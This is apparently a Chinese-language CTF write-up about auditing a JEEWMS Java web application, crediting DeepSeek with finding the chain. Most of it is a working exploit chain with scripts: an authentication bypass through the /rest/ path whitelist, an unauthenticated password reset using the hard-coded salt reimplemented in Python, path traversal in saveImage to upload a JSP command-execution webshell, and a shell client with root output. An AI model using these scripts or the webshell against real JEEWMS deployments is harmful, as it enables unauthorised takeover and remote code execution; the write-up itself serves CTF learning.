---
title: "CTFWEB 199.193.127.177:8081"
description: "一道 JEEWMS Java Web 题的代码审计复盘。"
publishDate: "2026-08-10T20:22:37"
tags:
  - "ctf"
  - "web"
heroImage: { src: './domino-girl.jpg', color: '#637EA2' }
language: '简中'
draft: false
---

> 学长出的雷霆 java 审计，0day，完全得自己审计
>
> **项目统计**
>
> - **Directories:** 1226
> - **Files:** 6281
>
> **代码统计**
>
> | Language                   | Files    | Blank      | Comment    | Code        |
> | -------------------------- | -------- | ---------- | ---------- | ----------- |
> | JavaScript                 | 1652     | 145505     | 183204     | 886541      |
> | CSS                        | 530      | 10138      | 5552       | 373051      |
> | JSP                        | 412      | 5306       | 4607       | 47636       |
> | JSON                       | 65       | 7          | 0          | 46321       |
> | Freemarker Template        | 124      | 1400       | 1348       | 31539       |
> | SVG                        | 274      | 5          | 11         | 24711       |
> | LESS                       | 163      | 6142       | 2480       | 24455       |
> | HTML                       | 40       | 211        | 1012       | 3776        |
> | Velocity Template Language | 18       | 32         | 6          | 3008        |
> | JSP Tag Library Definition | 1        | 17         | 69         | 1700        |
> | Maven                      | 1        | 36         | 173        | 865         |
> | XML                        | 20       | 60         | 110        | 841         |
> | SCSS                       | 18       | 103        | 32         | 472         |
> | Text                       | 5        | 12         | 0          | 303         |
> | Properties                 | 10       | 139        | 248        | 207         |
> | SQL                        | 16       | 2          | 0          | 153         |
> | Markdown                   | 6        | 62         | 0          | 144         |
> | Python                     | 1        | 14         | 9          | 57          |
> | PHP                        | 2        | 9          | 10         | 24          |
> | Ruby                       | 1        | 1          | 2          | 11          |
> | **SUM**                    | **3359** | **169201** | **198873** | **1445815** |
>
> 拼尽全力最终放弃，深刻意识到自己 java 跟没学过一样，虽然确实没学过，不过复盘时拿 deepseek pro 的雷霆 1m 上下文直接“注意到”下面写的利用链，甚至直接打密码，太牛逼了，ctf 烷基八氮了，不过这条利用链被学长批判了，似乎从一开始知道过滤器那里存在一个 /rest/* 路由是被 permit 的后，就能直接匿名调用后端方法，先调用后端 upload ，写一个 jsp 用 zip 打进去，然后调用 unzip 解压加路径穿越，这个 unzip 方法的解压路径是可控的，所以可以直接把马解压到 tomcat 那层，让 tomcat 去解析然后执行就能 get shell 了，ai 那个知道了 /rest/* 处的漏洞还硬打密码有点脱裤子放屁了(，然后还说他这条利用链是能手搓出来的(111真的吗😭看来是得学学 java 了。。。)下面是 deepseek 的雷霆思路：

## 雷霆分析

拿到一个 138MB 的 WAR 包，里面 800+ class 文件、400+ JSP、27 个 jar 包。如果试图逐行看完所有代码再下手，一天都看不完

所以解包后第一件事，打开 `WEB-INF/web.xml`，不需要看完全文，直接看：

```text
1. <servlet> 和 <servlet-mapping> — 哪些 URL 模式被映射？有几个 Servlet？
2. <filter> 和 <filter-mapping> — 过滤器链的顺序？
3. <listener> — 启动时做了什么？
4. <session-config> — session 超时多长？
```

注意到：

```xml
<!-- 主 Servlet -->
<servlet-mapping>
    <servlet-name>springMvc</servlet-name>
    <url-pattern>*.do</url-pattern>
    <url-pattern>*.action</url-pattern>
</servlet-mapping>

<!-- REST Servlet -->
<servlet-mapping>
    <servlet-name>restSpringMvc</servlet-name>
    <url-pattern>/rest/*</url-pattern>
</servlet-mapping>
```

两个 DispatcherServlet ，且它们的 `contextConfigLocation` 指向同一份 `spring-mvc.xml`

然后看鉴权，打开 `spring-mvc.xml`，直奔 `<mvc:interceptors>` 段落：

```xml
<mvc:interceptors>
    <!-- 编码拦截器 — 所有路径 -->
    <!-- Sign 拦截器 — /api/** -->
    <!-- ★ AuthInterceptor — 所有路径，带白名单 -->
    <!-- WmsApiInterceptor — 特定 WMS API 方法 -->
</mvc:interceptors>
```

看到白名单列表：

```xml
<property name="excludeUrls">
    <list>
        <value>loginController.do?checkuser</value>
        <value>loginController.do?login</value>
        <value>loginController.do?changeDefaultOrg</value>
        <value>rest/tokens/login</value>
        <value>rest/wmToDownGoodsController</value>
        <value>rest/wvStockController</value>
        <!-- ... -->
    </list>
</property>
<property name="excludeContainUrls">
    <list>
        <value>wmsApiController.do</value>  <!-- 整个 Controller 放行！ -->
    </list>
</property>
```

但这只是配置文件里的声明。真正起作用的逻辑在反编译后的 Java 代码里，于是反编译 `AuthInterceptor`，看 `preHandle()` 方法：

```java
public boolean preHandle(HttpServletRequest request, ...) {
    String requestPath = ResourceUtil.getRequestPath(request);

    // ★ 第 87 行 — 正则直接放行 rest 路径
    if (requestPath.matches("^rest/[a-zA-Z0-9_/]+$")) {
        return true;
    }

    // 精确白名单
    if (this.excludeUrls.contains(requestPath)) { return true; }
    // 包含白名单
    if (this.moHuContain(this.excludeContainUrls, requestPath)) { return true; }

    // 下面才是 session 校验...
    Client client = ClientManager.getInstance().getClient(session.getId());
    ...
}
```

看到 `return true` 在 session 校验之前就要高度警觉， 这个正则只要不包含 `?` 就绕过全部认证。

但 `requestPath` 到底是什么？追 `getRequestPath()`：

```java
// ResourceUtil.java:89-100
public static String getRequestPath(HttpServletRequest request) {
    String queryString = request.getQueryString();  // URL 中 ? 后的部分
    String requestPath = request.getRequestURI();   // /jeewms/rest/xxx

    if (StringUtils.isNotEmpty(queryString)) {
        requestPath = requestPath + "?" + queryString;
    }
    // 截断到第一个 &
    if (requestPath.indexOf("&") > -1) {
        requestPath = requestPath.substring(0, requestPath.indexOf("&"));
    }
    requestPath = requestPath.substring(request.getContextPath().length() + 1);
    return requestPath;
}
```

现在可以画出一张精确的认证边界表：

| HTTP 请求                            | queryString | requestPath                 | 正则匹配? | 是否需要认证 |
| ------------------------------------ | ----------- | --------------------------- | --------- | ------------ |
| `GET /rest/user`                     | null        | `rest/user`                 | ✅        | ❌ 绕过      |
| `PUT /rest/user/abc`                 | null        | `rest/user/abc`             | ✅        | ❌ 绕过      |
| `POST /rest/user` (JSON body)        | null        | `rest/user`                 | ✅        | ❌ 绕过      |
| `GET /rest/user?id=1`                | `id=1`      | `rest/user?id=1`            | ❌        | ✅ 需要      |
| `PUT /rest/tokens/saveImage?a=1&b=2` | `a=1&b=2`   | `rest/tokens/saveImage?a=1` | ❌        | ✅ 需要      |

结论：所有无查询参数的 `/rest/` 请求不需要认证。而有查询参数的（包括用了 `?` 的 GET/PUT/POST）则需要登录 Session。这为后面选择攻击入口提供了精确的指导。

认证边界画清楚后，下一步是找能造成实际危害的端点，直接 grep：

```bash
# 优先级 1: 用户管理和密码
grep -rn 'TSUser\|password\|saveOrUpdate\|createUser\|changePassword'

# 优先级 2: 文件写入
grep -rn 'FileOutputStream\|MultipartFile\|getInputStream\|FileCopyUtils'

# 优先级 3: 命令执行
grep -rn 'Runtime.exec\|ProcessBuilder\|getRuntime()'

# 优先级 4: SQL 拼接（找注入点）
grep -rn 'createSQLQuery\|findListbySql\|executeSql'
```

优先级排序的原因：

1. 能改密码 = 能登录 = 能拿到 Session - 这是把「未授权」升级为「认证」的跳板
2. 能写文件 = 能写 webshell = 命令执行 - 这是最终目标
3. 命令执行 = 直接拿 flag - 如果能直接 RCE 就不用走前两步
4. SQL 注入 = 能读数据库 = 可能读到 flag 或其他凭据 - 备选方案

grep 结果出来后逐个排查。`UserRestController` 第一个跳出来——打开看一眼：

```java
@Controller
@RequestMapping(value = {"/user"})
public class UserRestController {

    @RequestMapping(method = {RequestMethod.PUT}, consumes = {"application/json"})
    public ResponseEntity<?> update(@RequestBody TSUser user) {
        this.userService.saveOrUpdate(user);  // ← 直接更新，无任何鉴权
        return new ResponseEntity(HttpStatus.NO_CONTENT);
    }
}
```

类上没有 `@PreAuthorize`、方法上没有 session 检查、参数直接用 `@RequestBody` 绑定 JSON。 结合 Step 2 的结论 — PUT 请求 body 在 JSON 里、URL 不带 `?` → requestPath 匹配正则 → 未授权可访问

再查文件写入。`TokenController.saveImage` 跳出来：

```java
String fileName = request.getParameter("imageFileName");  // 无校验
String fileAddr = request.getParameter("fileAddr");
// ...
fileAddr = f.getCanonicalPath();  // 只规范化了目录部分
// 然后：
new FileOutputStream(fileAddr + File.separator + fileName);  // fileName 未经任何处理！
```

立刻识别出路径穿越模式：`getCanonicalPath()` + 未过滤的 fileName → `../` 可用

发现两个漏洞后，模拟攻击链：

```text
PUT /rest/user/{id}     → 改密码    → 需要什么？只需要 user_id
loginController.do      → 登录      → 需要什么？新密码
PUT /rest/tokens/saveImage → 写 shell → 需要什么？JSESSIONID
GET /shell.jsp           → 执行命令  → 需要什么？shell 已存在
```

检查卡点：

改密码需要知道密码加密方式。追 `PasswordUtil`：

```text
// 发现是 PBEWithMD5AndDES，静态盐 "63293188"
// → 可以自己实现加密算法，算出新密码的密文
// → Google: "PBEWithMD5AndDES key derivation MD5 1000 iterations"
// → 写出 Python 复现
```

这个卡点打通后，整条链就完整了。

回溯整个链，三个漏洞缺一不可：

| 如果缺少…                 | 会发生什么                                          |
| ------------------------- | --------------------------------------------------- |
| 漏洞 ① rest 正则绕过      | PUT /rest/user 被 AuthInterceptor 拦截 → 改不了密码 |
| 漏洞 ② 密码算法可复现     | 改了密码但加密值算不出来 → 登录失败                 |
| 漏洞 ③ saveImage 路径穿越 | 有 Session 但无法写 shell → 只能操作 WMS 业务数据   |

代码审计只给了静态视角。利用时还需要知道服务器环境。本题可以在**不实际访问服务器**的情况下，从配置文件反推部署环境：

```properties
# sysConfig.properties
webUploadpath=C://upFiles
office_home=D://OpenOffice
```

`C://`、`D://` — Windows 路径格式。但从后续的错误回显看：

```text
/usr/local/tomcat/C:/upFiles/test.txt (No such file or directory)
```

路径以 `/usr/local/tomcat/` 开头 — 这实际上是 Linux 服务器，`C:` 被当作普通目录名处理了！

由此推算出 Tomcat 位置和穿越层数：

```text
webapps 目录:  /usr/local/tomcat/webapps/
upFiles 目录:  /usr/local/tomcat/C:/upFiles/
穿越:         从 upFiles → C: → tomcat → webapps = 3 层 ../
payload:      ../../../webapps/jeewms/shell.jsp
```

自此雷霆利用链分析完毕，开始雷霆利用

## 雷霆利用

这里 GET 访问 `/jeewms/rest/user` 满足放行，直接返回所有用户，其中一个是：

```json
[{"id":"2c9380839fd5a9d5019fd5e98bd60029","userName":"ctfuser_000279ixle","realName":"CTF User","browser":null,"userKey":null,"password":"0f514e9b48d2184ca21dc9e3dd2a2d68004fbedb91e71924","activitiSync":0,"status":1,"deleteFlag":0,"signature":null,"departid":null,"currentDepart":{"id":null,"departname":null,"description":null,"orgCode":null,"orgType":null,"mobile":null,"fax":null,"address":null,"departOrder":null,"tsdeparts":[],"tspdepart":null},"signatureFile":null,"mobilePhone":null,"officePhone":null,"email":null,"userType":null,"createDate":null,"createBy":null,"createName":null,"updateDate":null,"updateBy":null,"updateName":null}
```

然后 PUT 带着 id 访问满足放行可以直接更新数据库里存的密码

而加密手法写死了且已知：

```java
public class PasswordUtil {
    public static final String ALGORITHM = "PBEWithMD5AndDES";
    public static final String Salt = "63293188";
    private static final int ITERATIONCOUNT = 1000;
```

所以这里能直接把数据库中加密后的密码改成自己设计的

雷霆手搓：

### pwd.py

```python
import requests
import hashlib
from Crypto.Cipher import DES

def jeecg_password_hash(username, password):
    salt = b"63293188"
    iterations = 1000

    digest = hashlib.md5(password.encode() + salt).digest()
    for _ in range(iterations - 1):
        digest = hashlib.md5(digest).digest()

    key = digest[:8]
    iv = digest[8:16]

    data = username.encode()
    pad_len = 8 - len(data) % 8
    data += bytes([pad_len]) * pad_len

    cipher = DES.new(key, DES.MODE_CBC, iv)
    return cipher.encrypt(data).hex()

user_id = "2c9380839fd5a9d5019fd5e98bd60029"
username = "ctfuser_000279ixle"
new_password = "Resi123456"

password_hash = jeecg_password_hash(username, new_password)

s = requests.Session()

url = "http://199.193.127.177:8081/jeewms"
pwd = "Resi123456"
payload = {
    "id": user_id,
    "userName": username,
    "realName": "CTF User",
    "password": password_hash,
    "activitiSync": 0,
    "status": 1,
    "deleteFlag": 0
}

r = requests.put(f"{url}/rest/user/x", json=payload, timeout=10)

print(r.status_code)
print(r.text)
```

现在密码改成了 `Resi123456`，直接登录

拿到 `JSESSIONID`（牛逼。。。）

```http
Cookie: JSESSIONID=C2106CC68EAF418328F677C77CF86FE5; JEECGINDEXSTYLE=ace; ZINDEXNUMBER=1990
```

又因为前面看到 `saveImage` 那里 `fileName` 中的 `../` 不会被规范化，也没有任何扩展名校验，可以直接路径穿越写 shell

### jsp.py

```python
import requests

target = "http://199.193.127.177:8081/jeewms"

s = requests.Session()

s.cookies.set("JSESSIONID", "55CA42F6779C75BC691C85112C80D119")
s.cookies.set("JEECGINDEXSTYLE", "ace")
s.cookies.set("ZINDEXNUMBER", "1990")

shell_body = b'''<% 
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    java.io.InputStream in = p.getInputStream();
    int c;
    while ((c = in.read()) != -1) out.write(c);
%>'''

url = f"{target}/rest/tokens/saveImage?imageFileName=../../../webapps/jeewms/shell.jsp&fileAddr=x"

r = requests.put(url, data=shell_body, cookies=s.cookies,
                  headers={"Content-Type": "application/octet-stream"})

print(r.status_code)
print(r.text)
```

### shell.py

```python
import requests

target = "http://199.193.127.177:8081/jeewms"

s = requests.Session()

while True:
    cmd = input("$ ")
    if cmd == "exit":
        break
    r = requests.get(f"{target}/shell.jsp", params={"cmd": cmd})
    print(r.text)
```

然后 get shell ，直接是 root 用户

```text
(venv) resi@MacBook-Air 脚本 % python shell.py
$ id
uid=0(root) gid=0(root) groups=0(root)

$ ls /
8cf4d099675b
bin
boot
__cacert_entrypoint.sh
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var

$ ls /8cf4d099675b
flag_5c3411c3

$ cat /8cf4d099675b/flag_5c3411c3
flag{we1c0me_t0_jeewm5_she1l_pwn!}
```

## Flag

```text
flag{we1c0me_t0_jeewm5_she1l_pwn!}
```